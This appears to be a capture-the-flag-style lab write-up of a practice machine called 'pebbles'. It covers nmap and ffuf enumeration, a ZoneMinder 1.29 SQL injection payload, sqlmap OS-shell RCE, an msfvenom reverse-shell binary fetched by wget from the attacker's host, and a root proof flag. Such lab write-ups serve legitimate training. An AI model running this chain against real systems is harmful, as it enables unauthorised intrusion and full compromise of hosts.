> Noamro08 - 29 Feb 2024

### Target: 192.168.202.52
---
### Enumeration:
nmap scan - services + default scans:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/pebbles]
└─$ nmap -Pn -n -A 192.168.202.52 -oN initial.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 14:51 IST
Nmap scan report for 192.168.202.52
Host is up (0.078s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Tomcat
|_http-favicon: Apache Tomcat
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

all ports scan:
```bash
nmap -Pn -n -p- 192.168.202.52 -oN all_ports.scan
# Nmap 7.94SVN scan initiated Thu Feb 29 14:53:26 2024 as: nmap -Pn -n -p- -oN all_ports.scan 192.168.202.52
Nmap scan report for 192.168.202.52
Host is up (0.078s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy
```

scan for port 3305:
```bash
nmap -Pn -n -A -p3305 192.168.202.52                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 14:59 IST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 192.168.202.52
Host is up (0.077s latency).

PORT     STATE SERVICE VERSION
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Trying ftp port 21:
there is no anonymous logon, leaving this port for now.

in port 80 we see login page, default creds are not working, fuzzing directories with ffuf:
```bash
ffuf -u http://192.168.202.52/FUZZ -w /usr/share/dirb/wordlists/big.txt -c
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.202.52/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 84ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3002ms]
cgi-bin/                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 77ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 77ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 77ms]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 79ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 89ms]
zm                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 79ms]
```

"zm" looks interesting, and it is "ZoneMinder Console - Running - default v1.29.0".
searching [online](https://www.exploit-db.com/exploits/41239) we can see that there is SQL injection for "Zoneminder 1.29":
It appears that the limit parameter is vulnerable to stacked queries. Using the following POST payload:
view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5
We can make the server sleep for 5 seconds.
![[Pasted image 20240229155157.png]]

with sqlmap we can ger RCE: 
```bash
sqlmap http://192.168.202.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -p limit --os-shell
```

i generated rev shell with msfvenom:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.166 LPORT=80 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

and started python server:
```bash
python3 -m http.server 80
```

now download this file with the rce and catch the rev shell with nc listener:
```bash
os-shell> wget http://192.168.45.166/shell.elf
os-shell> chmod +x shell.elf
```

![[Pasted image 20240229165820.png]]
we get the shell as root!

```bash
cat /root/proof.txt:
c78ef30a7034c751939072f67a4bc5ec
```